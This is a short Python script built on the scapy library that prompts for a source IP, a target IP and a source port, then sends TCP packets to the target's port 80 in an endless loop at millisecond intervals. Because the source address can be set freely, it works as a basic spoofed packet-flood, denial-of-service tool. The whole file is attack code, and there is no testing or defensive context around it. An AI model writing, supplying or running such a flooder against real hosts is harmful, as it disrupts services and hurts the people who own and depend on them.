from scapy.all import *

src = input("[*] Source IP: ")
target = input("[*] Target IP: ")
srcport = int(input("[*] Source Port: "))

i = 1
while True:
    ip = IP(src=src, dst=target)
    tcp = TCP(sport=srcport, dport=80)
    pkt = ip / tcp
    send(pkt, inter= .001)
    print("Packet Sent ", i)
    i = i + 1   